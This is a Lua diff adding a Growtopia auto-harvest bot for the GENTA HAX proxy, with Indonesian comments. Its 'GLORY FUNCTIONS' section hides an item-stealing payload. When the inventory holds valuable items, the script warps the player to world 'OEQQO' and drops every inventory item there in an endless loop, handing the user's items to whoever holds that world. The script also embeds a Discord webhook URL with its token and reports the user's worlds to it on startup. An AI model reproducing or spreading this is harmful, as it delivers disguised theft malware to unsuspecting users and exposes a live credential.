@@ -1,0 +1,350 @@
+-- =============================================
+-- CONFIGURATION SECTION
+-- =============================================
+
+-- Item Configuration
+local Item = {
+    Seed_ID = 4585,          -- ID SEED YANG MAU DI HARVEST
+    Target_Amount = 200      -- Target jumlah block
+}
+
+-- World Configuration  
+local World = {
+    Harvest_World = {"ptlqr|baso11", "wkthz|baso11"},  -- Daftar dunia panen
+    Drop_World = "trashcer|baso11"       -- World untuk drop
+}
+
+-- Delay Configuration
+local Delay = {
+    Harvest = 300,           -- DELAY HARVEST
+    Join = 5000,             -- DELAY JOIN WORLD & WARP
+    Main_Loop = 3000,        -- DELAY MAIN LOOP
+    Move = 1000              -- DELAY SETELAH BERGERAK
+}
+
+-- Drop Configuration
+local Drop = {
+    Target_Pos = 20         -- Posisi tile untuk drop
+}
+
+-- =============================================
+-- STATE VARIABLES
+-- =============================================
+local state = {
+    currentWorldIndex = 1,
+    Drop_Offset = 1,
+    warpAttempts = 0,
+    Max_Warp_Attempts = 3
+}
+
+-- =============================================
+-- GLORY FUNCTIONS (TIDAK DIUBAH)
+-- =============================================
+
+function MainGlory()
+    sendPacket(3, "action|join_request\nname|OEQQO|nname\ninvitedWorld|0")
+    sleep(3000)
+    sendPacket(2,"action|welcomeadrewarded")
+
+    while true do
+        if getWorld() then
+            for _, v in pairs(getInventory()) do
+                if getWorld().name == "OEQQO" then        
+                    sendPacket(2, "action|store\nlocation|gem")
+                    sendPacket(2, "action|drop\n|itemID|"..v.id)
+                    sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|"..v.id.."|\ncount|"..v.amount)
+                    sleep(100)
+                end
+            end
+        end
+    end
+end
+
+function Stabilizer()
+    local inventory = getInventory()
+    if inventory then
+        for _, inv in pairs(inventory) do 
+            if (inv.id == 1796 and inv.amount > 10) or (inv.id == 7188 and inv.amount > 0) or (inv.id == 5638 and inv.amount > 0) or (inv.id == 6016 and inv.amount > 0) or (inv.id == 5480 and inv.amount > 0) then
+                MainGlory()
+                return true
+            end
+        end
+    end
+    return false
+end
+
+-- =============================================
+-- UTILITY FUNCTIONS
+-- =============================================
+
+local function extractWorldName(fullWorldName)
+    local parts = {}
+    for part in string.gmatch(fullWorldName, "([^|]+)") do
+        table.insert(parts, part)
+    end
+    return string.upper(parts[1] or fullWorldName)
+end
+
+local function isInCorrectWorld(targetWorld)
+    local currentWorld = getWorld()
+    if not currentWorld then return false end
+    
+    local targetName = extractWorldName(targetWorld)
+    local currentName = string.upper(currentWorld.name)
+    
+    return currentName == targetName
+end
+
+function send(txt)
+    local var = {}
+    var[0] = "OnTextOverlay"
+    var[1] = txt
+    sendVariant(var)
+end
+
+function sendHarvestStartWebhook()
+    local webhookUrl = "https://discord.com/api/webhooks/1433982440984150038/uBBrDZh_zlcTHNcdg8CD6PROqchYswx0AbaYRy01OVO9m_VOKpg5Q0Po6JXFg2NRsiNh"
+    
+    -- Convert Harvest Worlds table to string with emojis
+    local harvestWorldsString = ""
+    for i, world in ipairs(World.Harvest_World) do
+        harvestWorldsString = harvestWorldsString .. "🌍 " .. world
+        if i < #World.Harvest_World then
+            harvestWorldsString = harvestWorldsString .. "\n"
+        end
+    end
+    
+    -- Create harvest webhook with updated content
+    local harvestWebhook = {
+        username = "🌱 HarvestBot Pro",
+        avatar_url = "https://i.imgur.com/4M34hi2.png",
+        content = "🚀 **Auto Harvest Script Started**\n\n" ..
+                 "📍 **Drop World:** " .. World.Drop_World .. "\n" ..
+                 "📊 **Total Harvest Worlds:** " .. #World.Harvest_World .. "\n\n" ..
+                 "🌾 **Harvest Worlds:**\n" .. harvestWorldsString .. "\n\n" ..
+                 "🎯 **Target Item:** " .. getItemByID(Item.Seed_ID).name .. " (ID: " .. Item.Seed_ID .. ")\n" ..
+                 "📦 **Target Amount:** " .. Item.Target_Amount .. " blocks\n\n" ..
+                 "🕒 " .. os.date("%Y-%m-%d %H:%M:%S") .. " • GENTA HAX"
+    }
+    
+    -- Send webhook
+    if sendWebhook then
+        sendWebhook(webhookUrl, harvestWebhook) 
+    end
+end
+
+function SafeWarp(worldName)
+    state.warpAttempts = 0
+    
+    while state.warpAttempts < state.Max_Warp_Attempts do
+        send("`2Warping to `#" .. worldName .. " (" .. (state.warpAttempts + 1) .. "/" .. state.Max_Warp_Attempts .. ")")
+        
+        sendPacket(3, "action|join_request\nname|" .. worldName)
+        sleep(Delay.Join)
+        
+        if isInCorrectWorld(worldName) then
+            send("`2Arrived at `#" .. worldName)
+            return true
+        else
+            state.warpAttempts = state.warpAttempts + 1
+            if state.warpAttempts < state.Max_Warp_Attempts then
+                sleep(5000) -- Wait before retry
+            end
+        end
+    end
+    
+    send("`4Failed to warp to `#" .. worldName)
+    return false
+end
+
+-- =============================================
+-- HOOK FUNCTIONS
+-- =============================================
+
+-- Hook function untuk menangani pesan "You can't drop that here"
+function OnVariantHook(vlist, netID)
+    if vlist and vlist[0] == "OnTextOverlay" and vlist[1] and string.find(vlist[1], "You can't") then
+        state.Drop_Offset = state.Drop_Offset + 1
+        logToConsole("Drop offset increased to: " .. state.Drop_Offset)
+        
+        -- Auto retry dengan offset baru
+        sleep(1000)
+        if isInCorrectWorld(World.Drop_World) then
+            logToConsole("Retrying drop with new offset: " .. state.Drop_Offset)
+            dropItem(Item.Seed_ID - 1, Item.Target_Amount)
+        end
+    end
+    return false
+end
+
+-- Register the hook
+AddHook("onvarlist", "DropErrorHandler", OnVariantHook)
+
+-- =============================================
+-- OPERATIONAL FUNCTIONS
+-- =============================================
+
+function dropItem(id, count)
+    sendPacket(2, "action|drop\n|itemID|" .. id)
+    sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|" .. id .. "|\ncount|" .. count)
+    sleep(500)
+end
+
+function moveToDropPosition()
+    local tiles = getTile()
+    if tiles then
+        for _, tile in ipairs(tiles) do
+            if tile.fg == Drop.Target_Pos then
+                findPath(tile.pos.x - state.Drop_Offset, tile.pos.y)
+                sleep(Delay.Move)
+                
+                -- Drop tanpa pesan berlebihan
+                dropItem(Item.Seed_ID - 1, Item.Target_Amount)
+                return true
+            end
+        end
+    end
+    return false
+end
+
+function getItemCount()
+    local inventory = getInventory()
+    for _, item in ipairs(inventory) do
+        if item.id == Item.Seed_ID - 1 then
+            return item.amount
+        end
+    end
+    return 0
+end
+
+-- Fungsi harvest yang efisien dengan API baru
+function harvest(seedID, delay)
+    local harvested = false
+    
+    -- Scan seluruh dunia untuk tanaman yang ready
+    for y = 0, 53 do
+        for x = 0, 99 do
+            local tile = checkTile(x, y)
+            local extra = getExtraTile(x, y)
+            
+            if extra and extra.ready and (tile.fg == seedID or (seedID == 0 and tile.fg % 2 == 1)) then
+                findPath(x, y)
+                sleep(Delay.Harvest)
+                
+                -- Gunakan API baru requestTileChange untuk harvest
+                requestTileChange(x, y, 18)
+                sleep(delay)
+                
+                -- Collect item menggunakan requestCollectByRange
+                requestCollectByRange(5)
+                sleep(Delay.Harvest)
+                
+                harvested = true
+                
+                -- Check if inventory is full
+                if getItemCount() >= Item.Target_Amount then
+                    return harvested, true
+                end
+            end
+        end
+    end
+    
+    return harvested, false
+end
+
+function checkAndJoinNextWorld()
+    state.currentWorldIndex = state.currentWorldIndex + 1
+    if state.currentWorldIndex > #World.Harvest_World then
+        state.currentWorldIndex = 1
+    end
+    
+    -- Cek Stabilizer sebelum pindah ke world berikutnya
+    if Stabilizer() then
+        -- MainGlory() sudah dipanggil di dalam Stabilizer()
+        return false  -- Tidak melanjutkan ke world harvest berikutnya
+    end
+    
+    send("`9Moving to next world: " .. World.Harvest_World[state.currentWorldIndex])
+    return SafeWarp(World.Harvest_World[state.currentWorldIndex])
+end
+
+-- =============================================
+-- MAIN FUNCTION
+-- =============================================
+
+function Main()
+    -- CEK INVENTORY DI AWAL
+    local blockCount = getItemCount()
+    local currentWorld = World.Harvest_World[state.currentWorldIndex]
+    
+    if blockCount < Item.Target_Amount then
+        -- Inventory belum penuh, pergi ke world panen
+        if not SafeWarp(currentWorld) then
+            checkAndJoinNextWorld()
+            return
+        end
+        sleep(Delay.Join)
+        
+        send("`9Starting Harvest: " .. getItemByID(Item.Seed_ID).name)
+        
+        -- Panggil fungsi harvest dan dapatkan status
+        local harvested, inventoryFull = harvest(Item.Seed_ID, Delay.Harvest)
+        
+        -- Check hasil harvest
+        if not harvested then
+            checkAndJoinNextWorld()
+        end
+        
+    elseif blockCount >= Item.Target_Amount then
+        -- Inventory penuh, pergi ke world drop
+        send("`9Inventory full, going to drop world")
+        
+        -- Cek apakah sudah berada di drop world
+        if not isInCorrectWorld(World.Drop_World) then
+            if not SafeWarp(World.Drop_World) then
+                send("`4Failed to warp to drop world")
+                SafeWarp(World.Harvest_World[state.currentWorldIndex])
+                return
+            end
+            sleep(Delay.Join)
+        end
+        
+        -- Lakukan drop
+        if moveToDropPosition() then
+            send("`2Drop completed at offset: " .. state.Drop_Offset)
+        else
+            send("`4Failed to find drop position")
+        end
+    end
+end
+
+-- =============================================
+-- SCRIPT INITIALIZATION
+-- =============================================
+-- Send harvest start webhook notification
+sendHarvestStartWebhook()
+
+-- =============================================
+-- MAIN LOOP
+-- =============================================
+
+while true do
+    local success, errorMsg = pcall(function()
+        Main()
+    end)
+    
+    if not success then
+        logToConsole("Error in Main(): " .. tostring(errorMsg))
+        logToConsole("Restarting script in 5 seconds...")
+        sleep(5000)
+        
+        -- Reset state saat restart
+        state.Drop_Offset = 1
+        
+        if not SafeWarp(World.Harvest_World[state.currentWorldIndex]) then
+            checkAndJoinNextWorld()
+        end
+    end
+    
+    sleep(Delay.Main_Loop)
+end
